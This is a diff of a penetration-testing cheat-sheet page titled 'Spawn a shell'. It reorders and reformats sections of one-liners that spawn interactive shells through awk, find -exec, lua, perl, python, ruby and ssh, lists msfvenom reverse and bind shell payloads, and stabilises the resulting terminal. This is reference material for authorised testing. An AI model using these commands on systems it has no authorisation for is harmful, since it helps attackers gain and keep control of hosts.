@@ -11,10 +11,10 @@ tags:
 # Spawn a shell
 
 ??? abstract "All about shells"
-    | **Shell Type**                       | **Description**                                                                                                                                                                                                                                   |
-    | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-    | [`Reverse shell`](reverse-shells.md) | Initiates a connection back to a "listener" on our attack box.                                                                                                                                                                                    |
-    | [`Bind shell`](bind-shells.md)       | "Binds" to a specific port on the target host and waits for a connection from our attack box.                                                                                                                                                     |
+    | **Shell Type** | **Description** |
+    | ---- | ------|
+    | [`Reverse shell`](reverse-shells.md) | Initiates a connection back to a "listener" on our attack box.  |
+    | [`Bind shell`](bind-shells.md)       | "Binds" to a specific port on the target host and waits for a connection from our attack box. |
     | [`Web shell`](web-shells.md)         | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command. |
 
 
@@ -45,6 +45,13 @@ There are three main types of shell connections:
 
 ## Spawn a shell
 
+### awk
+
+```bash
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+
 ### bash
 
 ```bash
@@ -67,6 +74,50 @@ echo 'os.system('/bin/bash')'
 ```
 
 
+### find 
+
+```bash
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+# This use of the find command is searching for any file listed after the -name option, then it executes awk (/bin/awk) and runs the same script we discussed in the awk section to execute a shell interpreter.
+
+find . -exec /bin/sh \; -quit
+# This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.
+```
+
+
+### lua
+
+```bash
+lua: os.execute(‘/bin/sh’)
+```
+  
+
+### msfvenom
+
+You can generate a webshell by using  msfvenom
+
+```bash
+# List payloads
+msfvenom --list payloads | grep x64 | grep linux | grep reverse  
+```
+
+Also msfvenom can use metasploit payloads under “cmd/unix”  to generate one-liner bind or reverse shells. List options with:
+
+```bash
+msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
+```
+
+
+
+### perl
+
+```bash
+perl -e 'exec "/bin/sh";'
+
+perl:  exec "/bin/sh";
+```
+
+
 ### python
 
 ```bash
@@ -81,22 +132,6 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
-### ssh
-
-```bash
-/bin/sh -i
-```
-
-
-### perl
-
-```bash
-perl -e 'exec "/bin/sh";'
-
-perl:  exec "/bin/sh";
-```
-
-
 ### ruby
 
 ```bash
@@ -104,12 +139,12 @@ ruby:  exec "/bin/sh";
 ```
 
 
-### lua
+### ssh
 
 ```bash
-lua: os.execute(‘/bin/sh’)
+/bin/sh -i
 ```
-  
+
 
 ### socat
 
@@ -163,41 +198,6 @@ stty rows <num> columns <cols>
 reset; export SHELL=bash; export TERM=xterm-256color; stty rows <num> columns <cols>
 
 ```
-
-### msfvenom
-
-You can generate a webshell by using  msfvenom
-
-```bash
-# List payloads
-msfvenom --list payloads | grep x64 | grep linux | grep reverse  
-```
-
-Also msfvenom can use metasploit payloads under “cmd/unix”  to generate one-liner bind or reverse shells. List options with:
-
-```bash
-msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
-```
-
-
-
-### awk
-
-```bash
-awk 'BEGIN {system("/bin/sh")}'
-```
-
-
-### find 
-
-```bash
-find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
-# This use of the find command is searching for any file listed after the -name option, then it executes awk (/bin/awk) and runs the same script we discussed in the awk section to execute a shell interpreter.
-
-find . -exec /bin/sh \; -quit
-# This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.
-```
-
 
 ### VIM
 
